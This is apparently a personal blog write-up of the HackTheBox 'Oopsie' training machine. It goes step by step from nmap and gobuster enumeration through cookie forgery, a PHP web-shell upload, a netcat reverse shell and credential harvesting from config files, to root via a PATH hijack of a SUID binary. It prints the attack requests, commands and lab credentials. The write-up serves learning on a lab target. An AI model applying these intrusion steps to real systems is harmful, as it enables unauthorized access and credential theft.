+++
title = "HackTheBox Write-up&mdash;Oopsie"
date = 2021-03-22
+++

This machine is found at IP `10.10.10.28`, and was quite fun to hack.

# The Short Version

1. Enumerate ports via `nmap -sC -sV 10.10.10.28`. Notice an HTTP server at port `80`;
2. Go to `http://10.10.10.28:80/cdn-cgi/login/`;
3. Log into the website using the username `admin` and the password `MEGACORP_4dm1n!!` from the previous (Archetype) box;
4. Clicking on the Uploads tab we see that we need to be a "super admin" to access this. Clicking on the Accounts tab, we see our account there. Intercepting the Accounts tab request in Burp Suite, we can brute-force the `id` value in the query parameter for this request, and at `id=30` we find a `super admin` account;
5. Using the super admin account's cookie parameters, now you can intercept the request to the Uploads tab and access it fully;
6. Using these super admin cookie parameters, you can upload a [reverse shell file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to the server, but be sure to change the [IP address in the script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L49) to yours (`tun0` on Linux; on my mac when connected to ethernet it was the `utun2` connection);
7. In a new terminal window, run `nc6 -nlvp 1234` (or just `nc` on Linux);
8. Now you want to, in a new terminal window, `curl http://10.10.10.28/uploads/php-reverse-shell.php`. This will activate the listener in your other window;
9. In the listener window, you now have a web shell. To turn it into a better terminal, run
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
10. Run `cat /var/www/html/cdn-cgi/login/db.php` to get a user's login information: `robert`, whose password is `M3g4C0rpUs3r!`. We can login as Robert using `su robert`;
11. Run `cat $HOME/user.txt` to get the user flag!;
12. Run `cd /tmp; export PATH=/tmp:$PATH; echo '/bin/bash' > cat && chmod +x cat`. This will create a `cat` executable that takes precedence in `PATH`, but this executable will spawn a bash instance;
13. Now when we go to run `bugtracker`, a root shell will spawn;
14. Finally, run `PATH=$(getconf PATH) && cat /root/root.txt` to capture the root flag!

# The Long Version

I enumerate the box (which is apparently easy) and get the following.


```
$ bash common/nmap.sh oopsie
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:37 NZDT
Nmap scan report for oopsie (10.10.10.28)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds
```

I go to `http://oopsie:80/` and we see a car-related website with the words `Bringing EV Ecosystem | Robust Design`.  I look at source and see it has an `images` subdomain that I don't have access to.  I can enumerate subdomains using `gobuster` and we find:
```
$ bash common/gobuster.sh 'http://oopsie:80/'
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://oopsie:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/22 20:44:31 Starting gobuster in directory enumeration mode
===============================================================
http://oopsie:80/.htaccess            (Status: 403) [Size: 271]
http://oopsie:80/.htpasswd            (Status: 403) [Size: 271]
http://oopsie:80/css                  (Status: 301) [Size: 298] [--> http://oopsie/css/]
http://oopsie:80/fonts                (Status: 301) [Size: 300] [--> http://oopsie/fonts/]
http://oopsie:80/images               (Status: 301) [Size: 301] [--> http://oopsie/images/]
http://oopsie:80/js                   (Status: 301) [Size: 297] [--> http://oopsie/js/]
http://oopsie:80/server-status        (Status: 403) [Size: 271]
http://oopsie:80/themes               (Status: 301) [Size: 301] [--> http://oopsie/themes/]
http://oopsie:80/uploads              (Status: 301) [Size: 302] [--> http://oopsie/uploads/]

===============================================================
2021/03/22 20:46:16 Finished
===============================================================
```
But we don't have access to any of these.

Throughout the page's source code, there are references to Hamburgers for some reason.  I think these usually refer to those three stacked bars that are for the menu icon that look like a simplistic hamburger, but this is noted.  Also in the source code I find `http://oopsie/cdn-cgi/login/script.js`, so I go to the subdomain `http://oopsie/cdn-cgi/login/` and I get to a login page.  This login page redirects to `http://oopsie/cdn-cgi/login/index.php`.  My immediate thought is to use SQL injections, because this is what a simple box would probably entail?

We look at the `index.php` code here, and we see that there is a `pen.js` subdomain/file after `index.php`.

While searching for ways to penetrate using `pen.js`, I found [this seemingly useful resource](https://www.exploit-db.com/papers/12871).

We have recently completed the Archetype starting box, and I got a nudge from Reddit to think about stuff from there.  So I try username `admin` and the admin password for that box: `MEGACORP_4dm1n!!`.  Indeed, it works and we are faced with a repair management system admin page.

![oopsie admin](./assets/oopsie-admin.png)

Clicking on the Uploads tab, it says we need *super* admin rights...

![oopsie super admin](./assets/oopsie-super-admin.png)

Now clicking on the Accounts tab, we are faced with a table with one admin user!

<table align="center">
	<thead>
		<tr>
			<td>Access ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>34322</code></td>
			<td>admin</td>
			<td><code>admin@megacorp.com</code></td>
		</tr>
	</tbody>
</table>

Given that it has an ID, I am curious what happens if we intercept the Uploads request.  Using Burp Suite, we get the following:
```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=accounts&id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close
```

So that one-row table seems to be us?  But we need `superadmin` rights.  So I change `role=superadmin` but still the same error.  I also tried `role=super%20admin`, `role=super-admin`, and `role=super admin`, but no luck.  Worth a try.

Now to the Branding tab, we see another one-row table:
<table align="center">
	<thead>
		<tr>
			<td>Brand ID</td>
			<td>Model</td>
			<td>Price</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>10</code></td>
			<td><code>MC-1123</code></td>
			<td>$110,240</td>
		</tr>
	</tbody>
</table>

Though it probably won't come up, note that they are not from certain parts of Europe, as they are using a numerical comma indicitive of a separator, not a decimal point (cars wouldn't be as low as $110).

Now onto the Clients page:

<table align="center">
	<thead>
		<tr>
			<td>Client ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>1</code></td>
			<td>Tafcz</td>
			<td><code>john@tafcz.co.uk</code></td>
		</tr>
	</tbody>
</table>

I am most interested in the Accounts tab, as I hope that the table shows more if you have different request cookies or query parameters.  This is what we intercept:
```
GET /cdn-cgi/login/admin.php?content=accounts&id=1 HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close
```

The request parameters are `content=accounts` and `id=1`.  We could perhaps try different `id`s.  I try `id=2` and get an empty page&mdash;but not an error!  This is good.  Perhaps a certain ID/parameter combination lets me see different accounts.  Let's look for the super admin!  To do this, we can use Burp's Intruder tab (<kbd>&#8984;</kbs> + <kbd>I</kbd>).  Going into the Positions sub-tab, delete the curly symbols around everything except the `id`, so it should look like this:
```
GET /cdn-cgi/login/admin.php?content=accounts&id=§§ HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close

```

(Keep the attack type as Sniper).  Now go into the Payloads sub-tab.  We want to populate the "Payload Opions [Simple list]" section.  We can generate a list of 1000 IDs to start with:
```bash
for i in $(seq 1 1000); do echo "$i"; done | pbcopy # or
julia -e '[println(i) for i in 1:1000]' | pbcopy # etc; there are many ways to skin a cat (but seriously, who skins cats?!)
```

Now paste it into the aforementioned section.  Click on the Options tab and ensure that we "Always" Follow Redirections.  Also select the option to "Process cookies in redirections".

Going back to the Target tag, we can now press Start attack.  We slowly see the responses coming through, their lengths and their statuses, etc.  We look for any irregularities.

Immediately, (well, after waiting a little), we see that `id=30` produces a different length to all the others.  Going back to Repeater [note: sending something from Proxy to Repeater, you can use the <kbd>&#8984;</kbs> + <kbd>R</kbd> shortcut], we change ID=30, and we see

<table align="center">
	<thead>
		<tr>
			<td>Access ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>86575</code></td>
			<td>super admin</td>
			<td><code>superadmin@megacorp.com</code></td>
		</tr>
	</tbody>
</table>

Now I think we can try what we were trying before with the Uploads intercept!  Intercepting the Uploads request and sending to Repeater, we change
```
user=34322; role=admin
```
to
```
user=86575; role=super admin
```

And show response in browser for easy access.  We can upload a file!  This is excellent, because we have done Remote Code Execution (RCE) before.  Let's put in a simple display script, so that our request looks like this:
```
POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Host: oopsie
Content-Length: 401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://oopsie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxCPwDzmeB8D1ILNO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=86575; role=super admin
Connection: close

------WebKitFormBoundaryxCPwDzmeB8D1ILNO
Content-Disposition: form-data; name="name"

evil
------WebKitFormBoundaryxCPwDzmeB8D1ILNO
Content-Disposition: form-data; name="fileToUpload"; filename="display.php"
Content-Type: text/php

<html><head><title>Display a file</title></head>
<body>
<? echo system("cat ".$_GET[’file’]); ?>
</body></html>
------WebKitFormBoundaryxCPwDzmeB8D1ILNO--
```

This uploaded successfully (which is good, because they haven't checked for file extensions!).

Recall that we say an `uploads` directory from `gobusters` earlier!  Let's try uploading a [reverse shell PHP file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) on:

```
POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Host: oopsie
Content-Length: 6371
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://oopsie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQG5MQDvEzdbIdQ1i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=86575; role=super admin
Connection: close

------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
Content-Disposition: form-data; name="name"

evil2
------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.php"
Content-Type: text/php

<?php
...
?>
------WebKitFormBoundaryQG5MQDvEzdbIdQ1i--
```

We upload this as `php-reverse-shell.php`.  Now we run the classic `nc6 -nlvp 1234` in one tab, and in another, run `curl http://oopsie/uploads/php-reverse-shell.php`.  In the listener tab, we have a reverse shell!

Now we are in, let's see where we are and what is here:
```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ pwd
pwd
/var/www/html/cdn-cgi/login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We log in as our friend Bob to actually run the executable:
```bash
$ su robert
su: must be run from a terminal
```

Okay, well we can do some tricks to the web shell to make it a little nicer:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Note: since completing this box, I have found another way of doing this:
```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

Now that we have a terminal, we can login as Robert, using the above credentials:
```bash
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
robert@oopsie:/$ cd home
cd home
robert@oopsie:/home$ ls
ls
robert
robert@oopsie:/home$ cd robert
cd robert
robert@oopsie:~$ ls
ls
cat  LinEnum.sh  user.txt
robert@oopsie:~$ cat user.txt
cat user.txt
f2c7************************7981
```

And we have the user flag!  But I also notice an attractive-looking shell script in there...let's run it and see:
```bash
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Apr  7 12:36:19 UTC 2021


### SYSTEM ##############################################

...

[-] Hostname:
oopsie


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

...

### INTERESTING FILES ####################################

...

[-] SUID files:

...

-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
...

### SCAN COMPLETE ####################################
```

First notice that Robert is part of a group called `bugtracker`.  Further down, under the Interesting Files header, we find a `bugtracker` executable:
```bash
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Interesting!  Running this, we get a prompt to provide bug ID.  Providing it with bug ID `1`, we get
```bash
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

There seem to be two other bugs, but no fourth (and presumable no fifth, etc.).
```bash
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 4
4
---------------

cat: /root/reports/4: No such file or directory

robert@oopsie:~$
```

Unfortunately the executable is compiled, but from the above `cat` error we can gleam that `cat` is used to print some report file.  What we can do is something very clever: create our own `cat` executable and give it priority in path so that the `bugtracker` command uses this instead!  If our own cat creates a shell of its own, then we will have root privileges!
```bash
robert@oopsie:~$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo '/bin/bash' > cat && chmod +x cat
echo '/bin/sh' > cat && chmod +x cat
```

Now running `bugtracker` once more we look to have silent success:
```bash
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

root@oopsie:/tmp#
```

Indeed, we are now a root user!  We can collect our flag and leave at once.
```bash
root@oopsie:/tmp# whoami
whoami
root
root@oopsie:/tmp# cd /root
cd /root
root@oopsie:/root# ls -A
ls -A
.bash_history  .cache	.gnupg	.profile  root.txt  .viminfo
.bashrc        .config	.local	reports   .ssh
root@oopsie:/root# PATH=$(getconf PATH)
PATH=$(getconf PATH)
root@oopsie:/root# cat root.txt
cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```

<br>

---

<br>

## Notes

I got a little nudge for the final step of this.  But boy, this is a simple solution.  I had never thought of this before, and it is ever-so clever!

Another quick note: because this box used something from the previous box, I had a little look around, especially in this root directory:

```bash
# find . -type f | while IFS= read -r line; do echo "\n\n\033[1;38m$line\033[0;38m"; cat "$line"; done
find . -type f | while IFS= read -r line; do echo "\n\n\033[1;38m$line\033[0;38m"; cat "$line"; done

...

./.config/filezilla/filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

Good to note that there is a username and password in plain text here in this last file we found.
